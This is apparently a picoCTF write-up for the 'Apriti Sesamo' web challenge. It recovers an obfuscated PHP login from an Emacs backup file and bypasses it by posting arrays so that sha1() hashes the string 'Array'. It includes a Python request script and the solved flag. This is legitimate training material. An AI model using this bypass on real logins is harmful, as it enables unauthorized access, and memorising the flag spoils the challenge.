# Apriti Sesamo

|  | 300 points

Author: Junias Bonou

### Description

I found a web app that claims to be impossible to hack!

Hints:

1. Backup files
2. Rumor has it, the lead developer is a militant emacs user

![image](https://github.com/user-attachments/assets/1f6fff7c-1374-4f58-8a75-465325ecba96)

![image 1](https://github.com/user-attachments/assets/4965c5b4-fb74-46aa-846e-0face183baf1)

In Emacs, when you edit and save a file, it often creates a backup copy of the original file by appending a "~" symbol to the filename. This backup file might contain the original code.

/impossibleLogin.php~

```php
<?php 
	if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];
		$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");
	} else
		{
			if(sha1($yuf85e0677)===sha1($rs35c246d5))
			{
				echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));
			} else
			{
				echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");
			}
	}
}?>

WHICH MEANS:

<?php
if (isset($_POST["username"]) && isset($_POST["pwd"])) {
    $username = $_POST["username"];
    $password = $_POST["pwd"];
    if ($username == $password) {
        echo "Login failed!";
    } else {
        if (sha1($username) === sha1($password)) {
            echo file_get_contents("../flag.txt");
        } else {
            echo "Failed! No flag for you";
        }
    }
}
?>
```

- **Condition 1**: If username equals pwd ($username == $password), the login fails immediately.
- **Condition 2**: If username and pwd are different ($username != $password) but their SHA-1 hashes are identical (sha1($username) === sha1($password)), the flag is returned.
- **Otherwise**: If neither condition is met, it outputs the failure message you’re seeing.

### Exploiting PHP Type Juggling

In PHP, the sha1() function expects a string input. If you pass a non-string type like an array, PHP converts it to the string "Array" before hashing

- If username is an array like ["a"] and pwd is an array like ["b"]:
    - username != pwd because ["a"] and ["b"] are different arrays (array comparison in PHP checks key/value pairs).
    - sha1($username) becomes sha1("Array"), and sha1($pwd) also becomes sha1("Array"), which are equal because they hash the same string.

Our payload:

```jsx
import requests

url = "http://verbal-sleep.picoctf.net:50765/impossibleLogin.php"
data = {
    "username[]": "a",
    "pwd[]": "b"
}
response = requests.post(url, data=data)
print(response.text)
```

![image 2](https://github.com/user-attachments/assets/cc64e10d-bf6d-4998-848e-cd2d8865a2db)

The warning triggers because it received an array instead of a string. PHP’s type juggling kicks in here, converting both arrays to "Array", which is why the hashes match.

- Each call to sha1() (once for username and once for pwd) triggers a warning because it received an array instead of a string.
- PHP’s type juggling kicks in here, converting both arrays to "Array", which is why the hashes match.
- Then we get the flag: picoCTF{w3Ll_d3sErV3d_Ch4mp_2d9f3447}
